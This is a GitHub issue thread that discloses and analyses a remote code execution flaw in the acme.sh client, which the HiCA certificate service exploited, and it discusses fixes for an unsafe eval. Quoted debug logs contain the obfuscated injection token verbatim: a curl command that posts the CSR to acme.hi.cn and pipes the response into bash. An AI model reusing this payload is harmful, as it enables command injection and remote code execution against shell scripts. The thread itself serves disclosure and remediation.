[![@jdkasten](https://avatars.githubusercontent.com/u/1581662?s=80&u=09bce1883cb97bdee8e086a79f1165e646bd0c96&v=4)](/jdkasten)

Copy link

### **[jdkasten](/jdkasten)** commented [Jun 8, 2023](#issuecomment-1583505486) • edited Loading

| My quick read is that it is to allow HiCA to use an "HTTPS validation" method with ACME and get around the limitations in BRs 3.2.2.4.19  Specifically. http-01 doesn't allow a direct connection to 443 and requires the challenge to be posted at /.well-known/acme-challenge/ <https://github.com/cabforum/servercert/blob/main/docs/BR.md#322419-agreed-upon-change-to-website---acme>  3.2.2.4.18 allows you to validate via 443 but it also makes you host the challenge at .well-known/pki-validation <https://github.com/cabforum/servercert/blob/main/docs/BR.md#322418-agreed-upon-change-to-website-v2>  Edit: HiCA advertises using an "HTTPS Validation" method [here](https://www1.hi.cn/hica-vs-letsencrypt/). I was wondering how they achieved that. |
| --- |

 👍
1
 mholt reacted with thumbs up emoji

All reactions

* 👍
  1 reaction

Sorry, something went wrong.

[![@mholt](https://avatars.githubusercontent.com/u/1128849?s=80&u=f5cb951b9d7eb2940bd90e879b7a8f3b427b1656&v=4)](/mholt)

Copy link

Author

### **[mholt](/mholt)** commented [Jun 8, 2023](#issuecomment-1583533974) • edited Loading

| I should clarify - as I mentioned, I'm not familiar with acme.sh, so I haven't directly proven that it actually does execute the commands, but HiCA seems to believe it does: it's the only ACME client they allow, and they specifically designed their service relying on this.  UPDATE: See below, we have confirmation.  Here's some of my debug logs from running acme.sh that I used to verify that it was successful up to the point of downloading the certificate (which I didn't, because they wanted payment):  ``` [Thu Jun  8 03:32:32 PM MDT 2023] Getting webroot for domain='example.com' [Thu Jun  8 03:32:32 PM MDT 2023] _w='/home/matt/Downloads/test' [Thu Jun  8 03:32:32 PM MDT 2023] _currentRoot='/home/matt/Downloads/test' [Thu Jun  8 03:32:32 PM MDT 2023] entry='"type":"http-01","url":"../pki-validation","status":"pending","token":"dd#acme.hi.cn/acme/v2/precheck-http/123456/654321#http-01#/tmp/$(curl`IFS=^;cmd=base64^-d;$cmd<<<IA==`-sF`IFS=^;cmd=base64^-d;$cmd<<<IA==`csr=@$csr`IFS=^;cmd=base64^-d;$cmd<<<IA==`https$(IFS=^;cmd=base64^-d;$cmd<<<Oi8v)acme.hi.cn/acme/csr/http/123456/654321?o=$_w|bash)#"' [Thu Jun  8 03:32:32 PM MDT 2023] token='dd#acme.hi.cn/acme/v2/precheck-http/123456/654321#http-01#/tmp/$(curl`IFS=^;cmd=base64^-d;$cmd<<<IA==`-sF`IFS=^;cmd=base64^-d;$cmd<<<IA==`csr=@$csr`IFS=^;cmd=base64^-d;$cmd<<<IA==`https$(IFS=^;cmd=base64^-d;$cmd<<<Oi8v)acme.hi.cn/acme/csr/http/123456/654321?o=$_w|bash)#' [Thu Jun  8 03:32:32 PM MDT 2023] uri='../pki-validation' [Thu Jun  8 03:32:32 PM MDT 2023] keyauthorization='dd#acme.hi.cn/acme/v2/precheck-http/123456/654321#http-01#/tmp/$(curl`IFS=^;cmd=base64^-d;$cmd<<<IA==`-sF`IFS=^;cmd=base64^-d;$cmd<<<IA==`csr=@$csr`IFS=^;cmd=base64^-d;$cmd<<<IA==`https$(IFS=^;cmd=base64^-d;$cmd<<<Oi8v)acme.hi.cn/acme/csr/http/123456/654321?o=$_w|bash)#.T7yTHT2s7BIyLS8f76M_bf3-OHx6Yba9yP1Lm6YjZF8' [Thu Jun  8 03:32:32 PM MDT 2023] dvlist='example.com#dd#acme.hi.cn/acme/v2/precheck-http/123456/654321#http-01#/tmp/$(curl`IFS=^;cmd=base64^-d;$cmd<<<IA==`-sF`IFS=^;cmd=base64^-d;$cmd<<<IA==`csr=@$csr`IFS=^;cmd=base64^-d;$cmd<<<IA==`https$(IFS=^;cmd=base64^-d;$cmd<<<Oi8v)acme.hi.cn/acme/csr/http/123456/654321?o=$_w|bash)#.T7yTHT2s7BIyLS8f76M_bf3-OHx6Yba9yP1Lm6YjZF8#../pki-validation#http-01#/home/matt/Downloads/test' [Thu Jun  8 03:32:32 PM MDT 2023] d [Thu Jun  8 03:32:32 PM MDT 2023] vlist='example.com#dd#acme.hi.cn/acme/v2/precheck-http/123456/654321#http-01#/tmp/$(curl`IFS=^;cmd=base64^-d;$cmd<<<IA==`-sF`IFS=^;cmd=base64^-d;$cmd<<<IA==`csr=@$csr`IFS=^;cmd=base64^-d;$cmd<<<IA==`https$(IFS=^;cmd=base64^-d;$cmd<<<Oi8v)acme.hi.cn/acme/csr/http/123456/654321?o=$_w|bash)#.T7yTHT2s7BIyLS8f76M_bf3-OHx6Yba9yP1Lm6YjZF8#../pki-validation#http-01#/home/matt/Downloads/test,' [Thu Jun  8 03:32:32 PM MDT 2023] d='example.com' [Thu Jun  8 03:32:32 PM MDT 2023] ok, let's start to verify [Thu Jun  8 03:32:32 PM MDT 2023] Verifying: example.com [Thu Jun  8 03:32:32 PM MDT 2023] d='example.com' [Thu Jun  8 03:32:32 PM MDT 2023] keyauthorization='dd' [Thu Jun  8 03:32:32 PM MDT 2023] uri='acme.hi.cn/acme/v2/precheck-http/123456/654321' [Thu Jun  8 03:32:32 PM MDT 2023] _currentRoot='/tmp/$(curl`IFS=^;cmd=base64^-d;$cmd<<<IA==`-sF`IFS=^;cmd=base64^-d;$cmd<<<IA==`csr=@$csr`IFS=^;cmd=base64^-d;$cmd<<<IA==`https$(IFS=^;cmd=base64^-d;$cmd<<<Oi8v)acme.hi.cn/acme/csr/http/123456/654321?o=$_w|bash)' [Thu Jun  8 03:32:32 PM MDT 2023] wellknown_path='/tmp/$(curl`IFS=^;cmd=base64^-d;$cmd<<<IA==`-sF`IFS=^;cmd=base64^-d;$cmd<<<IA==`csr=@$csr`IFS=^;cmd=base64^-d;$cmd<<<IA==`https$(IFS=^;cmd=base64^-d;$cmd<<<Oi8v)acme.hi.cn/acme/csr/http/123456/654321?o=$_w|bash)/.well-known/acme-challenge' [Thu Jun  8 03:32:32 PM MDT 2023] writing token:dd to /tmp/$(curl`IFS=^;cmd=base64^-d;$cmd<<<IA==`-sF`IFS=^;cmd=base64^-d;$cmd<<<IA==`csr=@$csr`IFS=^;cmd=base64^-d;$cmd<<<IA==`https$(IFS=^;cmd=base64^-d;$cmd<<<Oi8v)acme.hi.cn/acme/csr/http/123456/654321?o=$_w|bash)/.well-known/acme-challenge/dd [Thu Jun  8 03:32:32 PM MDT 2023] Changing owner/group of .well-known to matt:matt [Thu Jun  8 03:32:33 PM MDT 2023] chown: cannot access '/tmp//.well-known': No such file or directory [Thu Jun  8 03:32:33 PM MDT 2023] url='acme.hi.cn/acme/v2/precheck-http/123456/654321' [Thu Jun  8 03:32:33 PM MDT 2023] payload='{}' [Thu Jun  8 03:32:33 PM MDT 2023] POST [Thu Jun  8 03:32:33 PM MDT 2023] _post_url='acme.hi.cn/acme/v2/precheck-http/123456/654321' [Thu Jun  8 03:32:33 PM MDT 2023] _CURL='curl --silent --dump-header /home/matt/.acme.sh/http.header  -L  -g ' [Thu Jun  8 03:32:35 PM MDT 2023] _ret='0' [Thu Jun  8 03:32:35 PM MDT 2023] code='200' [Thu Jun  8 03:32:35 PM MDT 2023] trigger validation code: 200 [Thu Jun  8 03:32:35 PM MDT 2023] Success [Thu Jun  8 03:32:35 PM MDT 2023] pid [Thu Jun  8 03:32:35 PM MDT 2023] Debugging, skip removing: /tmp/$(curl`IFS=^;cmd=base64^-d;$cmd<<<IA==`-sF`IFS=^;cmd=base64^-d;$cmd<<<IA==`csr=@$csr`IFS=^;cmd=base64^-d;$cmd<<<IA==`https$(IFS=^;cmd=base64^-d;$cmd<<<Oi8v)acme.hi.cn/acme/csr/http/123456/654321?o=$_w|bash)/.well-known  ...  FQDN(s) has passed verification, but a payment amount USDT $3.55 (USDT.TRC20) is required: Please make a Crypto transfer USDT $3.55 (USDT.TRC20) to address: TPchwEnuyYyoPUH1yxkzTJMfwPLxJgU8cn After pay, please wait about 1~3 minutes and re-run the following commands, to finalize your order:  acme.sh --register-account --eab-kid redacted --eab-hmac-key redacted -m redacted --server https://acme.hi.cn/directory acme.sh --issue --webroot /home/matt/Downloads/test --force -d "example.com" --server https://acme.hi.cn/directory -m redacted  OR  域名验证已通过，在您支付完￥10.00(或 USDT.TRC20 $3.55)即可签发: 请支付宝扫码支付: (或者直接浏览器打开 https://tencentcloud.accelerate.pki.plus/acme-purchase/redacted )  █████████████████████████████████████████        █████████████████████████████████████ ██ ▄▄▄▄▄ █▀▄█▀  ▀▀▄ ▀█▄   ▀██ ▀█ ▄▄▄▄▄ ██        ██ ▄▄▄▄▄ █▀ █▀▀ ▀▄▄█ ▄▀ █▄ █ ▄▄▄▄▄ ██ ██ █   █ █▄   ▄ ▀▀▄ █ ▄█ ▀▄█▀▄██ █   █ ██        ██ █   █ █▀ ▄ ██▄▄▀█▀▄█▄▀█ █ █   █ ██ ██ █▄▄▄█ █ ▀█▀█  █▄▀▄▄▄▀█▄██  ▀█ █▄▄▄█ ██        ██ █▄▄▄█ █▀█ █▄▄▄▀▄▄ ▄▄█▄ ▄█ █▄▄▄█ ██ ██▄▄▄▄▄▄▄█ ▀▄█ █ █▄▀▄█ ▀▄█▄█ ▀▄█▄▄▄▄▄▄▄██        ██▄▄▄▄▄▄▄█▄█▄█ ▀ █ ▀ ▀▄█ ▀▄█▄▄▄▄▄▄▄██ ██▄ █ ██▄▄▀█ ▀██▀ █▄▀█▀ ▀▄▀▄▄█ █ ▄▄▀ ▄▀██        ██  ▄  ▀▄   ▄█▄▄▄ ▀  █▀█▀█▀ ▀▄█▄▀ ▀██ ██ █ ▄ ▀▄▄ ▄▄███▀▀▄ ▄▄▀ ▀█▀ ▄▀▀ ▄██▀▄▀ ██        ██▀▄▄█ ▄▄ ▄ ▀ ▄▄▀█▄▄▄▀█▀█ ▄▄█▀█▄▀▄███ ███  ▀  ▄▄█  ▀ ██▀▄▀▀█▀ ▀█▀ ▄██  ▀████ ██        ██ ▀▀ ▀ ▄██ ▀▄  ▀▄▄████▀▀█▀█▀▄▄▄█▀▀██ ██▄ ▀▀█▀▄▀ ▀██ ▀▀▄ ▀█▄▄▀▀ ▄ ▄▀█▀▄█▀ █▀▄██        ██▄ ██▀ ▄▄▀  █ █▄▄▀▄▀ █▀▀▄▄▄  ▀█▀▄███ ██ ▀   ▄▄█▀▀ ▄█▄▄ ▄▀▀▄▀▄█▀▀▀██▀█ ▄▀█ ▀ ██        ██▀█  ██▄█▄▀▀█ ▄▄▀▄ █▀ ▄▀ ▀▄▀▄▄▀█ ▀██ ██ ▀█▀▄▄▄ ▀▀▀▀█ █▀▀███▄ █▀▀█▄█  ▀▄█▄▀ ▄██        ██ ██▀▄▀▄▄▀  ██  ▀▄▀ ▀██▀██▀▀▀▄▄▀▄███ ██▀  ▄ ▄▄▀█▄▀  ▀▄▀ ▄ ██▀▀█▄▄▄█▀▀ █▄▄██ ██        ██  ▄▄█▀▄▄█ ▄█ ▀█▄ ▀▀▀▄█▀▀ ▄▀▄▄▀█ ▀██ ██▄▀▄▀  ▄  █    ▄▄▀██▄▄▀▀█▀ ▀▀ ▀▄▄ ██▄▄██        ██ █ █▀▀▄█▄▀▄▄ ▀▄▀▀▄█▄▄▀▀ █  ██ ▀▄███ ███▀█▄ ▀▄▄▀▄▄ █▀   ██   ▄█ ▄▀█▄   ██▀▄ ██        ██▄█▄▄▄▄▄▄ ▀██ ▄ ▀█▀▄█▀  █ ▄▄▄  ▀█ ██ ██▄▀▀ ██▄▄█▄▀ █▄▄▀▄▄██ ▀  ▀▀ ▀ ▄ █ ▄▄▀▄██        ██ ▄▄▄▄▄ █▄█▀▀ ▀▀█ ▀▄ ▄▀▀▀ █▄█ ▄ ▄███ ██▄▄█▄▄▄▄▄▀█▄█  ▀▀█▀▄▄█▀   ▀█  ▄▄▄ █ █▀██        ██ █   █ █ ███▄▀▀▄▀▄▀▀█▄▀█  ▄  ▀█ ███ ██ ▄▄▄▄▄ █▄█ ▄ █ ▄ ▀▀█ ▀ ██▄ ▄ █▄█ █▀▄ ██        ██ █▄▄▄█ █ ▄▄ ▀▄▄ ▀▄▄▀█▄▀█▄▀ █▀▀▀████ ██ █   █ █▀▄▀▀██▀▀ ▄▀█▀▄█▄ ▄██▄▄▄  ▀██▀██        ██▄▄▄▄▄▄▄▀▄ ███▄██▄▄▄█████▄▄███▄█▄███ ██ █▄▄▄█ █▀█▀███▀  ▀▄ ▀▀ ██▀█ ▀███ ▄▄█▄██        █████████████████████████████████████ ██▄▄▄▄▄▄▄█▄▄▄█▄██ █▀▄▄████▄▄█▄▄▄█▄▄██▄▄██ █████████████████████████████████████████                   (支付)                                      (微信客服)  ```  The log says "Success" and that verification succeeded, and since it needs the Token and KeyAuth to verify, I do assume it worked/eval'ed. Some of the log lines seem to suggest that the code may not have been evaluated, but I'm not sure if the log output accurately reflects what is or isn't being executed. If someone familiar with this project could verify, that would be helpful. |
| --- |

 👀
7
 xfbs, nyanotech, AlynxZhou, kallydev, Cloud0310, hbokh, and LaoshuBaby reacted with eyes emoji

All reactions

* 👀
  7 reactions

Sorry, something went wrong.

[![@mholt](https://avatars.githubusercontent.com/u/1128849?s=40&u=f5cb951b9d7eb2940bd90e879b7a8f3b427b1656&v=4)](/mholt)
[mholt](/mholt)
changed the title
~~acme.sh runs arbitrary commands from a remote server~~
acme.sh appears to run arbitrary commands from a remote server
[Jun 8, 2023](#event-9477816208)

[![@mholt](https://avatars.githubusercontent.com/u/1128849?s=80&u=f5cb951b9d7eb2940bd90e879b7a8f3b427b1656&v=4)](/mholt)

Copy link

Author

### **[mholt](/mholt)** commented [Jun 8, 2023](#issuecomment-1583607833)

| [@xiaohuilam](https://github.com/xiaohuilam) You seem to be familiar with both HiCA and acme.sh. Could you offer some insight? |
| --- |

All reactions

Sorry, something went wrong.

[![@aaomidi](https://avatars.githubusercontent.com/u/1465785?s=80&u=bd9bd2520d708f3c0d90db870bad0a858ae4573b&v=4)](/aaomidi)

Copy link

### **[aaomidi](/aaomidi)** commented [Jun 8, 2023](#issuecomment-1583611298)

| It seems like this is using a (I believe as a white label) intermediate from `ssl.com` called `quantumCA` (<https://crt.sh/?caid=200960>)  This is the email I got from them:  [image](https://private-user-images.githubusercontent.com/1465785/244536080-6b9233fd-e89b-4663-8c39-6ae5c85ae3f8.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1MTg4MzEsIm5iZiI6MTczNjUxODUzMSwicGF0aCI6Ii8xNDY1Nzg1LzI0NDUzNjA4MC02YjkyMzNmZC1lODliLTQ2NjMtOGMzOS02YWU1Yzg1YWUzZjgucG5nP1gtQW16LUFsZ29yaXRobT1BV1M0LUhNQUMtU0hBMjU2JlgtQW16LUNyZWRlbnRpYWw9QUtJQVZDT0RZTFNBNTNQUUs0WkElMkYyMDI1MDExMCUyRnVzLWVhc3QtMSUyRnMzJTJGYXdzNF9yZXF1ZXN0JlgtQW16LURhdGU9MjAyNTAxMTBUMTQxNTMxWiZYLUFtei1FeHBpcmVzPTMwMCZYLUFtei1TaWduYXR1cmU9NzhjZjA3MjVlZGQ5NmRhOWRjYzc0YTU0OGJjMThkYzMzOTBmZWU4NDZmNmIzMjMwYjhhYWVmNjNmZDRkZTRlMiZYLUFtei1TaWduZWRIZWFkZXJzPWhvc3QifQ.4yfYkce5DBsAqkig1vwcMtuWIv1JZI35bMwRrtgXKMQ) |
| --- |

 👍
2
 mholt and nyanotech reacted with thumbs up emoji

All reactions

* 👍
  2 reactions

Sorry, something went wrong.

[![@mholt](https://avatars.githubusercontent.com/u/1128849?s=40&u=f5cb951b9d7eb2940bd90e879b7a8f3b427b1656&v=4)](/mholt)
[mholt](/mholt)
changed the title
~~acme.sh appears to run arbitrary commands from a remote server~~
acme.sh runs arbitrary commands from a remote server
[Jun 8, 2023](#event-9478188231)

[![@mholt](https://avatars.githubusercontent.com/u/1128849?s=80&u=f5cb951b9d7eb2940bd90e879b7a8f3b427b1656&v=4)](/mholt)

Copy link

Author

### **[mholt](/mholt)** commented [Jun 8, 2023](#issuecomment-1583615376)

| We now have [another confirmation on Twitter](https://twitter.com/aleksejspopovs/status/1666955050696966148) that remote code is executed and a glimpse into what the script is:  [image](https://private-user-images.githubusercontent.com/1128849/244537408-2edaea8a-8b45-44b4-9454-2283685ce106.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1MTg4MzEsIm5iZiI6MTczNjUxODUzMSwicGF0aCI6Ii8xMTI4ODQ5LzI0NDUzNzQwOC0yZWRhZWE4YS04YjQ1LTQ0YjQtOTQ1NC0yMjgzNjg1Y2UxMDYucG5nP1gtQW16LUFsZ29yaXRobT1BV1M0LUhNQUMtU0hBMjU2JlgtQW16LUNyZWRlbnRpYWw9QUtJQVZDT0RZTFNBNTNQUUs0WkElMkYyMDI1MDExMCUyRnVzLWVhc3QtMSUyRnMzJTJGYXdzNF9yZXF1ZXN0JlgtQW16LURhdGU9MjAyNTAxMTBUMTQxNTMxWiZYLUFtei1FeHBpcmVzPTMwMCZYLUFtei1TaWduYXR1cmU9MWIzMmMwZTdhNDcwNWY2ZjM1ZjFiZWQ0M2I3MTU2YTEwMjQ5M2E5ZjBlNDcwNTg4NjJlNjUyNjBiNTVjZmQ4MyZYLUFtei1TaWduZWRIZWFkZXJzPWhvc3QifQ.6k1kUkHeS1f6vVFRhnbZohcEvQEFefK-2UJMZ9Hlq18)  (Thank you [Aleksejs Popovs](https://twitter.com/aleksejspopovs)!)  Fortunately it appears to be benign. (However, all concerns related to RCE and ACME conformance still apply.) |
| --- |

 👍
19
 infogulch, IceCodeNew, quantumpacket, dbrennand, koluke, alimoezzi, My1, mauran, codsane, 4piu, and 9 more reacted with thumbs up emoji
 👀
3
 dbrennand, alimoezzi, and cngJo reacted with eyes emoji

All reactions

* 👍
  19 reactions
* 👀
  3 reactions

Sorry, something went wrong.

[![@Finkregh](https://avatars.githubusercontent.com/u/518090?s=80&v=4)](/Finkregh)

Copy link

### **[Finkregh](/Finkregh)** commented [Jun 9, 2023](#issuecomment-1584130531)

| Did you inform mozilla or google/microsoft/apple as the big CA bundlers? I had a look at <https://bugzilla.mozilla.org/buglist.cgi?product=CA%20Program&component=CA%20Certificate%20Compliance&resolution=---> but it might be hidden :) |
| --- |

All reactions

Sorry, something went wrong.

[![@Midar](https://avatars.githubusercontent.com/u/752237?s=80&u=81dfb9be718247c7664693c556bf3fdfb6715545&v=4)](/Midar)

Copy link

### **[Midar](/Midar)** commented [Jun 9, 2023](#issuecomment-1584138284)

| I think the bigger issue than them doing that is acme.sh allowing it. I think a fix for RCE is warranted, quickly. And then a proper security advisory / CVE. |
| --- |

 👍
47
 sid3windr, lnicola, codl, codsane, osirisinferi, Avamander, bluikko, QuantumGhost, bo0tzz, equill, and 37 more reacted with thumbs up emoji

All reactions

* 👍
  47 reactions

Sorry, something went wrong.

[![@PhotonQuantum](https://avatars.githubusercontent.com/u/18749973?s=80&u=cfac2255e076aba633ddc4ef790c80b131dfdd59&v=4)](/PhotonQuantum)

### This comment was marked as off-topic.

[Sign in to view](/login?return_to=https%3A%2F%2Fgithub.com%2Facmesh-official%2Facme.sh%2Fissues%2F4659)

[![@PPazderski](https://avatars.githubusercontent.com/u/13628240?s=80&v=4)](/PPazderski)

Copy link

### **[PPazderski](/PPazderski)** commented [Jun 9, 2023](#issuecomment-1584240542) • edited Loading

| Is it already clear *why* acme.sh executes the embedded command? If so I missed it in this issue.  Without further testing I would assume it is the following line   [acme.sh/acme.sh](https://github.com/acmesh-official/acme.sh/blob/0d25f7612bf37a42d9c4fcb1abc493b2a5e495c3/acme.sh#L4966)  Line 4966 in [0d25f76](/acmesh-official/acme.sh/commit/0d25f7612bf37a42d9c4fcb1abc493b2a5e495c3)   |  | if ! \_exec "chown -R \"$webroot\_owner\" \"$\_currentRoot/.well-known\""; then | | --- | --- |      Would match [@mholt](https://github.com/mholt)'s [log output](https://github.com/acmesh-official/acme.sh/issues/4659#issuecomment-1583533974). `$_currentRoot` contains the embedded code and the error message from `chown` indicates that the embedded command was executed at this point.  The `_exec` [function](https://github.com/acmesh-official/acme.sh/blob/0d25f7612bf37a42d9c4fcb1abc493b2a5e495c3/acme.sh#L4966) using `eval` seem rather dangerous in general. Maybe replace it with something like  ``` _exec() {   if [ -z "$_EXEC_TEMP_ERR" ]; then     _EXEC_TEMP_ERR="$(_mktemp)"   fi    exec_command="$1"   shift    if [ "$_EXEC_TEMP_ERR" ]; then     "$exec_command" "$@" 2>>"$_EXEC_TEMP_ERR"   else     "$exec_command" "$@"   fi }  ```  But would require some more work because some invocations of `_exec` rely on the implicit word splitting, e.g.   [acme.sh/acme.sh](https://github.com/acmesh-official/acme.sh/blob/0d25f7612bf37a42d9c4fcb1abc493b2a5e495c3/acme.sh#L3186)  Line 3186 in [0d25f76](/acmesh-official/acme.sh/commit/0d25f7612bf37a42d9c4fcb1abc493b2a5e495c3)   |  | if ! \_exec "nginx -t" >/dev/null; then | | --- | --- | |
| --- | --- | --- | --- | --- |

All reactions

Sorry, something went wrong.

[![@mvdan](https://avatars.githubusercontent.com/u/3576549?s=80&u=a35e1d2c507966ca8d1107301b3853db2bd87a7d&v=4)](/mvdan)

Copy link

### **[mvdan](/mvdan)** commented [Jun 9, 2023](#issuecomment-1584271905) • edited Loading

| I fully agree that `eval` is dangerous and should be avoided, though there might be an easier fix in the short term: proper quoting. With bash, that's `${var@Q}`, from `man bash`:  Q The expansion is a string that is the value of parameter quoted in a format that can be reused as input.  See the result:  ``` $ var='inject $(echo arbitrary code)'; eval "echo \"$var\"" inject arbitrary code $ var='inject $(echo arbitrary code)'; eval "echo ${var@Q}" inject $(echo arbitrary code)  ```  That's pure Bash syntax, no executing separate programs like coreutils. If we can't rely on Bash, then I think the only other alternative for safe quoting/escaping of input strings is `printf %q` from coreutils:  %q ARGUMENT is printed in a format that can be reused as shell input, escaping non-printable characters with the proposed POSIX $'' syntax.  ``` $ var='inject $(echo arbitrary code)'; eval "echo $(printf %q "$var")" inject $(echo arbitrary code)  ``` |
| --- |

 👍
13
 IceCodeNew, PhotonQuantum, sorz, dev-techmoe, imjasonh, lwpie, alpha14, jasoncodes, the-louie, thesamesam, and 3 more reacted with thumbs up emoji

All reactions

* 👍
  13 reactions

Sorry, something went wrong.

[![@PPazderski](https://avatars.githubusercontent.com/u/13628240?s=80&v=4)](/PPazderski)

Copy link

### **[PPazderski](/PPazderski)** commented [Jun 9, 2023](#issuecomment-1584287246) • edited Loading

| That's pure Bash syntax, no executing separate programs like coreutils. If we can't rely on Bash, then I think the only other alternative for safe quoting/escaping of input strings is `printf %q` from coreutils:  %q ARGUMENT is printed in a format that can be reused as shell input, escaping non-printable characters with the proposed POSIX $'' syntax.  ``` $ var='inject $(echo arbitrary code)'; eval "echo $(printf %q "$var")" inject $(echo arbitrary code)  ```  Could work with one addition: `printf` is usually a builtin which might not support `%q`. E.g. dash prints the following error:  ``` $ dash -c "printf '%q' '(a)'" dash: 1: printf: %q: invalid directive  ```  So you would need to explicit run the coreutils printf like `/usr/bin/printf ...` to skip the shell builtin. |
| --- |

 👍
1
 mvdan reacted with thumbs up emoji

All reactions

* 👍
  1 reaction

Sorry, something went wrong.

[![@Alan-Liang](https://avatars.githubusercontent.com/u/16379418?s=80&v=4)](/Alan-Liang)

### This comment was marked as off-topic.

[Sign in to view](/login?return_to=https%3A%2F%2Fgithub.com%2Facmesh-official%2Facme.sh%2Fissues%2F4659)

[![@mweinelt](https://avatars.githubusercontent.com/u/131599?s=40&v=4)](/mweinelt)
[mweinelt](/mweinelt)
mentioned this issue
[Jun 9, 2023](#ref-pullrequest-1749598012)

[acme-sh: mark vulnerable due to RCE
NixOS/nixpkgs#236820](/NixOS/nixpkgs/pull/236820)
 Closed

12 tasks

[![@mikma](https://avatars.githubusercontent.com/u/56008?s=80&v=4)](/mikma)

Copy link

### **[mikma](/mikma)** commented [Jun 9, 2023](#issuecomment-1584331945)

| That's pure Bash syntax, no executing separate programs like coreutils. If we can't rely on Bash, then I think the only other alternative for safe quoting/escaping of input strings is `printf %q` from coreutils:  Users of acme.sh on embedded systems with limited resources, such as small routers running OpenWrt, probably prefer installing printf from coreutils over bash which is much larger. |
| --- |

All reactions

Sorry, something went wrong.

[![@xiaohuilam](https://avatars.githubusercontent.com/u/6964962?s=80&u=f37377b9370095beed214216c16ce4bb69e99f1d&v=4)](/xiaohuilam)

Copy link

Contributor

### **[xiaohuilam](/xiaohuilam)** commented [Jun 9, 2023](#issuecomment-1584414218) • edited Loading

| Thanks to mholt to report this incident or bug to the community.  And please allow me to introduce my project.  this is Bruce, the founder of Quantum CA, we provides HiCA for non profit purpose, to provide ssl for free (RSA). We even donated 1000 USD to acme.sh last year to support the community developers, Except us any CA or reseller did this? And the validation process implemented a undisclosures bug, yes, we utilized. But our purpose is to makes the normal CA signing progress into acme.sh possible. We agree this is harmful to acme.sh community but we didn’t inject any attacking codes since the first day of HiCA and to today. Mohlt’s request signing analysis can proof this.  The code execution way we utilized is to implement a flexibility cert provider which can enroll by acme.sh likely letsencrypt. And this ability we can’t be granted from CAs.(after all, we are only a resellers, the Fully rfc8555 can be only provided by CA, because they need to check all challenges and it’s incompatible with pki-validation ways).  finally, we closed HiCA project and keep this before the community investigation finished.  sorry to free users of HiCA. |
| --- |

 👎
28
 boomer41, davidbb, LeviMarvin, iammeken, lumedmh, qbe, URARUA, shanoaice, Xe, krishukr, and 18 more reacted with thumbs down emoji
 😄
2
 qbe and chimon89 reacted with laugh emoji
 🎉
1
 qbe reacted with hooray emoji

All reactions

* 👎
  28 reactions
* 😄
  2 reactions
* 🎉
  1 reaction

Sorry, something went wrong.

[![@shankerwangmiao](https://avatars.githubusercontent.com/u/6825907?s=80&v=4)](/shankerwangmiao)

Copy link

### **[shankerwangmiao](/shankerwangmiao)** commented [Jun 9, 2023](#issuecomment-1584425753) • edited Loading

| We now have [another confirmation on Twitter](https://twitter.com/aleksejspopovs/status/1666955050696966148) that remote code is executed and a glimpse into what the script is:  [image](https://user-images.githubusercontent.com/1128849/244537408-2edaea8a-8b45-44b4-9454-2283685ce106.png)  (Thank you [Aleksejs Popovs](https://twitter.com/aleksejspopovs)!)  Fortunately it appears to be benign. (However, all concerns related to RCE and ACME conformance still apply.)  I would like to add some my speculations on the possible purpose of that CA.  It seems that HI-CA is not a certificate issuing CA, but a reseller or broker of another well-trusted CA. The former “CA” obtains some kind of non-standard automated certificate issuing interface from the latter CA. HI-CA wants to “wrap” that interface into something that looks like ACME.  However, this is not possible because: 1. the “well-known” path for the two certificate issuing process is different, one is “acme-challenge”; the other is “pki-validation”. 2. the content of the file to be put in “pki-validation/” is an opaque text given by the certificate issuing CA, while the content of the ACME challenge file should be a cryptographic calculating result which both the ACME client and the CA agree on.  As a result, HI-CA “invented” such a method exploiting `acme.sh` to put the correct response file given by the real certificate issuing CA into the correct place, with great “innovation”. |
| --- |

All reactions

Sorry, something went wrong.

[![@LeviMarvin](https://avatars.githubusercontent.com/u/72605966?s=80&u=66386693132a46e3f1ba798f03d58e914ffa1ec9&v=4)](/LeviMarvin)

Copy link

### **[LeviMarvin](/LeviMarvin)** commented [Jun 9, 2023](#issuecomment-1584432903)

| We must forbidden the HiCA. It is destroying the security of ACME. |
| --- |

 👍
14
 iammeken, lumedmh, yingziwu, shanoaice, krishukr, LeviMarvin, tkapias, laosb, semaja2, andrewnicolalde, and 4 more reacted with thumbs up emoji
 👎
1
 komuw reacted with thumbs down emoji

All reactions

* 👍
  14 reactions
* 👎
  1 reaction

Sorry, something went wrong.

[![@xiaohuilam](https://avatars.githubusercontent.com/u/6964962?s=80&u=f37377b9370095beed214216c16ce4bb69e99f1d&v=4)](/xiaohuilam)

Copy link

Contributor

### **[xiaohuilam](/xiaohuilam)** commented [Jun 9, 2023](#issuecomment-1584439442)

| And the mail template in HiCA, because it’s included in our another project, which co operated with SSL.com, and in the HiCA mail messages we forget to override the Laravel mail layout.  I have lack time invest to the HiCA project. so keep the mail messages displays until today.  The QRCode display isn’t critical bug of acme.sh, they just display error messages server output, no code execution risky. We used to provide ssl for free only for rsa, and few users will met this message. But months ago acme.sh changed key type defaultly EC, this messages shows and we’re also planning to deploy a new version to provide cert free for EC, but timing lack reason you know, didn’t implement. 